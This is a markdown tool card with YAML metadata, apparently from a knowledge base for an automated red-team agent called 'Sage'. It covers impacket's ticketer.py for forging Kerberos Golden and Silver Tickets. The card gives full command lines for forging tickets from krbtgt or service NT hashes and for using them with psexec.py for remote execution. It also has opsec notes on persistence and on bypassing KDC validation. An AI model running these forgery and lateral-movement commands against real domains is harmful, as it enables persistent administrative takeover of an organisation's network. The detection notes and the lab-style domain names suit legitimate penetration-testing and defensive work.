---
name: impacket-ticketer
category: kerberos
subcategories: [golden-ticket, silver-ticket, ticket-forgery]
tradecraft_tags: [golden-ticket, silver-ticket, kerberos, forging, impacket, python]
mitre_attack:
  - id: T1558.001
    name: Steal or Forge Kerberos Tickets — Golden Ticket
  - id: T1558.002
    name: Steal or Forge Kerberos Tickets — Silver Ticket
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: ticketer.py
supported_os: [linux]
architecture: [x64]
privilege_required: none
network_required: false
detection_signal: |
  Forged Kerberos tickets that contain abnormal PAC data (e.g. group memberships not
  matching the actual user's groups) are detectable by MDI "Golden Ticket" detection.
  Golden Tickets with krbtgt encryption are difficult to distinguish from legitimate
  tickets if the forgery matches expected format. Silver Tickets are generally not
  validated against the KDC.
usage_examples:
  - description: Forge a Golden Ticket (krbtgt hash required)
    args: "ticketer.py -nthash <krbtgt-nthash> -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local administrator"
  - description: Forge a Silver Ticket for a specific service
    args: "ticketer.py -nthash <service-nthash> -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local -spn cifs/WINTERFELL.north.sevenkingdoms.local administrator"
  - description: Use the forged ticket with an impacket tool
    args: "KRB5CCNAME=administrator.ccache psexec.py -k -no-pass north.sevenkingdoms.local/administrator@WINTERFELL"
opsec_notes: |
  Python-only — infrastructure side. For Windows-side ticket forgery, use Mimikatz
  `kerberos::golden` or Rubeus (Silver Ticket option). Golden Tickets remain valid
  until krbtgt is rotated (requires two rotations with ~10h gap to fully invalidate).
  Silver Tickets bypass KDC validation entirely but are limited to specific services.
gotchas: |
  Python-only. Requires the krbtgt NT hash (Golden) or service account NT hash (Silver).
  The forged ticket is a ccache file — set `KRB5CCNAME` environment variable to use it
  with impacket tools. Rubeus and Mimikatz handle Golden/Silver Ticket forgery for
  Windows-side use.
related_ttps: [rubeus, mimikatz, impacket-secretsdump]
alternatives: [rubeus-golden, mimikatz-kerberos-golden]
common_args:
  -nthash:
    description: NT hash of krbtgt (Golden Ticket) or service account (Silver Ticket)
    typical_values: ["<nthash>"]
    required: true
  -domain-sid:
    description: Domain SID
    typical_values: ["S-1-5-21-..."]
    required: true
  -domain:
    description: Domain FQDN
    typical_values: ["north.sevenkingdoms.local"]
    required: true
  -spn:
    description: Target SPN for Silver Ticket
    typical_values: ["cifs/WINTERFELL.north.sevenkingdoms.local"]
  username:
    description: Username to forge the ticket for
    typical_values: ["administrator"]
    required: true
last_updated: 2026-05-29
---

# impacket-ticketer

impacket's `ticketer.py` — Python-based Golden and Silver Ticket forgery. Given the
krbtgt NT hash (for Golden Tickets) or a service account's NT hash (for Silver Tickets),
ticketer.py creates a forged Kerberos ticket in ccache format usable with impacket tools.

## Typical use cases
- Forge a Golden Ticket after DCSync gives krbtgt hash
- Forge a Silver Ticket for persistent service access
- Linux-side Kerberos ticket forgery for impacket tool chains

## How Sage uses this
Infrastructure-side Python tool. For Windows-side Golden/Silver Ticket forgery, Sage
uses Mimikatz `kerberos::golden` (via Apollo's native `mimikatz` command) or Rubeus.

## Apollo-specific note
Python/Linux only. For Windows-side ticket forgery use Mimikatz or Rubeus.
